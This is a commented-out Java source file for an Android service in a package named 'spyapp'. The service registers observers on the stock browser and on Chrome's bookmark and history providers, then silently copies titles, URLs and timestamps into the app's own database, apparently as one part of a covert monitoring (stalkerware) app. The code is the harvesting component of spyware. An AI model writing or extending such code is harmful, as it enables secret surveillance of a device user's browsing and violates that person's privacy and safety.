//package com.app.spyapp.service;
//
//import android.app.Service;
//import android.content.ContentResolver;
//import android.content.Intent;
//import android.database.ContentObserver;
//import android.database.Cursor;
//import android.net.Uri;
//import android.os.IBinder;
//import android.provider.Browser;
//import android.text.TextUtils;
//
//import com.app.spyapp.SpyApp;
//import com.app.spyapp.common.Const;
//import com.app.spyapp.common.Utils;
//import com.app.spyapp.model.BrowserModel;
//
//import java.util.ArrayList;
//
//
//public class BookmarkHistoryChangeService extends Service {
//    private static String CHROME_BOOKMARKS_URI =
//            "content://com.android.chrome.browser/bookmarks";
//    private static String CHROME_HISTORY_URI =
//            "content://com.android.chrome.browser/history";
//    private ContentResolver contentResolver;
//    private SpyApp spyApp;
//    private long lastTimeofCall = 0L;
//    private long lastTimeofUpdate = 0L;
//    private long threshold_time = 10000;
//
//    @Override
//    public IBinder onBind(Intent intent) {
//        return null;
//    }
//
//    @Override
//    public void onCreate() {
//        spyApp = (SpyApp) getApplicationContext();
//    }
//
//    public void registerObserver() {
//
//        //Browser Bookmark & history Observer
//        this.getApplicationContext()
//                .getContentResolver()
//                .registerContentObserver(
//                        Browser.BOOKMARKS_URI, true,
//                        new AndroidBroswerObserver());
//
//
//        //Chrome Bookmark onserver
//        ChromeBookmarkOberver chromeBookmarkOberver = new ChromeBookmarkOberver();
//        this.getApplicationContext()
//                .getContentResolver().registerContentObserver(Uri.parse(CHROME_BOOKMARKS_URI), true, chromeBookmarkOberver);
//        //Chrome history observer
//        ChromeHistoryOberver chromeHistoryOberver = new ChromeHistoryOberver();
//        this.getApplicationContext()
//                .getContentResolver().registerContentObserver(Uri.parse(CHROME_HISTORY_URI), true, chromeHistoryOberver);
//
//    }
//
//    //start the service and register observer for lifetime
//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//
//        registerObserver();
//
//        return START_STICKY;
//    }
//
//    class AndroidBroswerObserver extends ContentObserver {
//        public AndroidBroswerObserver() {
//            super(null);
//        }
//
//        @Override
//        public boolean deliverSelfNotifications() {
//            return true;
//        }
//
//        @Override
//        public void onChange(boolean selfChange) {
//            super.onChange(selfChange);
//            // here you call the method to fill the list
//            lastTimeofCall = System.currentTimeMillis();
//            if (lastTimeofCall - lastTimeofUpdate > threshold_time) {
//                ArrayList<BrowserModel> bookmarkList = getBookmark("content://browser/bookmarks", Const.TYPE_DEFAULT);
//                if (bookmarkList != null && bookmarkList.size() > 0) {
//                    for (int i = 0; i < bookmarkList.size(); i++) {
//                        BrowserModel browserModel = bookmarkList.get(i);
//                        if (!spyApp.getDatabaseHelper().isBookmarkExits(browserModel.getBookmarkid(), browserModel.getType())) {
//                            spyApp.getDatabaseHelper().insertBookmark(browserModel);
//                        }
//                    }
//                }
//                ArrayList<BrowserModel> historyList = getHistoryList("content://browser/bookmarks", Const.TYPE_DEFAULT);
//                if (historyList != null && historyList.size() > 0) {
//                    for (int i = 0; i < historyList.size(); i++) {
//                        BrowserModel browserModel = historyList.get(i);
//                        if (!spyApp.getDatabaseHelper().isHistoryExits(browserModel.getBookmarkid(), browserModel.getType())) {
//                            spyApp.getDatabaseHelper().insertHistory(browserModel);
//                        }
//                    }
//                }
//                lastTimeofUpdate = System.currentTimeMillis();
//            }
//        }
//
//    }
//
//    class ChromeBookmarkOberver extends ContentObserver {
//        public ChromeBookmarkOberver() {
//            super(null);
//        }
//
//        @Override
//        public void onChange(boolean selfChange) {
//            onChange(selfChange, null);
//        }
//
//        @Override
//        public void onChange(boolean selfChange, Uri uri) {
//            super.onChange(selfChange);
//            lastTimeofCall = System.currentTimeMillis();
//            if (lastTimeofCall - lastTimeofUpdate > threshold_time) {
//                ArrayList<BrowserModel> bookmarkList = getBookmark("content://com.android.chrome.browser/bookmarks", Const.TYPE_CHROME);
//                if (bookmarkList != null && bookmarkList.size() > 0) {
//                    for (int i = 0; i < bookmarkList.size(); i++) {
//                        BrowserModel browserModel = bookmarkList.get(i);
//                        if (!spyApp.getDatabaseHelper().isBookmarkExits(browserModel.getBookmarkid(), browserModel.getType())) {
//
//                            spyApp.getDatabaseHelper().insertBookmark(browserModel);
//                        }
//                    }
//                }
//                lastTimeofUpdate = System.currentTimeMillis();
//            }
//            // process cursor results
//        }
//    }
//
//    class ChromeHistoryOberver extends ContentObserver {
//        public ChromeHistoryOberver() {
//            super(null);
//        }
//
//        @Override
//        public void onChange(boolean selfChange) {
//            onChange(selfChange, null);
//        }
//
//        @Override
//        public void onChange(boolean selfChange, Uri uri) {
//            super.onChange(selfChange);
//            lastTimeofCall = System.currentTimeMillis();
//            if (lastTimeofCall - lastTimeofUpdate > threshold_time) {
//                ArrayList<BrowserModel> historyList = getHistoryList("content://com.android.chrome.browser/bookmarks", Const.TYPE_CHROME);
//                if (historyList != null && historyList.size() > 0) {
//                    for (int i = 0; i < historyList.size(); i++) {
//                        BrowserModel browserModel = historyList.get(i);
//                        if (!spyApp.getDatabaseHelper().isHistoryExits(browserModel.getBookmarkid(), browserModel.getType())) {
//                            spyApp.getDatabaseHelper().insertHistory(browserModel);
//                        }
//                    }
//                }
//                lastTimeofUpdate = System.currentTimeMillis();
//            }
//            // process cursor results
//        }
//    }
//
//
//    private ArrayList<BrowserModel> getBookmark(String uri, String type) {
//
//        ArrayList<BrowserModel> broswerList = new ArrayList<>();
//        String selection = Browser.BookmarkColumns.BOOKMARK + " = 1";
//        StringBuffer sb = new StringBuffer();
//        String[] proj = new String[]{Browser.BookmarkColumns._ID, Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE};
////        Uri uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");
//        Uri uriCustom = Uri.parse(uri);
//
//
////        Uri uriCustom = Uri.parse("content://org.mozilla.firefox.db.browser/bookmarks");
//
//        Cursor cursor = getContentResolver().query(uriCustom, proj, selection, null, Browser.BookmarkColumns.DATE + " DESC");
//        cursor.moveToFirst();
//
//        if (cursor.moveToFirst() && cursor.getCount() > 0) {
//            boolean cont = true;
//            sb.append("Browse Details :");
//            while (cursor.isAfterLast() == false && cont) {
//                String date = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.DATE));
//                String callDayTime = "";
//                if (!TextUtils.isEmpty(date)) {
//                    callDayTime = Utils.convertMilisToDate(Long.parseLong(date));
//                }
//                String id = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns._ID));
//                String title = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
//                String url = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL));
//                // Do something with title and url
//                BrowserModel browserModel = new BrowserModel();
//                browserModel.setBookmarkid(id);
//                browserModel.setTitle(title);
//                browserModel.setUrl(url);
//                browserModel.setType(type);
//                browserModel.setDatetime(callDayTime);
//                broswerList.add(browserModel);
//                sb.append("\nTitle:--- " + title + " \nURL:--- " + url + " \nDate:--- " + callDayTime);
//                sb.append("\n----------------------------------");
//                cursor.moveToNext();
//            }
//            return broswerList;
//        }
//        return null;
//    }
//
//    private ArrayList<BrowserModel> getHistoryList(String uri, String type) {
//
//        ArrayList<BrowserModel> broswerList = new ArrayList<>();
//        String selection = Browser.BookmarkColumns.BOOKMARK + " = 0";
//        StringBuffer sb = new StringBuffer();
//        String[] proj = new String[]{Browser.BookmarkColumns._ID, Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE};
//        Uri uriCustom = Uri.parse(uri);
////        Uri uriCustom = Uri.parse("content://org.mozilla.firefox.db.browser/bookmarks");
//        Cursor cursor = getContentResolver().query(uriCustom, proj, selection, null, Browser.BookmarkColumns.DATE + " DESC");
//        cursor.moveToFirst();
//
//        if (cursor.moveToFirst() && cursor.getCount() > 0) {
//            boolean cont = true;
//            sb.append("Browse Details :");
//            while (cursor.isAfterLast() == false && cont) {
//                String date = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.DATE));
//                String callDayTime = "";
//                if (!TextUtils.isEmpty(date)) {
//                    callDayTime = Utils.convertMilisToDate(Long.parseLong(date));
//                }
//                String id = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns._ID));
//                String title = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
//                String url = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL));
//                // Do something with title and url
//                BrowserModel browserModel = new BrowserModel();
//                browserModel.setBookmarkid(id);
//                browserModel.setTitle(title);
//                browserModel.setUrl(url);
//                browserModel.setType(type);
//                browserModel.setDatetime(callDayTime);
//                broswerList.add(browserModel);
//                sb.append("\nTitle:--- " + title + " \nURL:--- " + url + " \nDate:--- " + callDayTime);
//                sb.append("\n----------------------------------");
//                cursor.moveToNext();
//            }
//            return broswerList;
//        }
//        return null;
//    }
//}
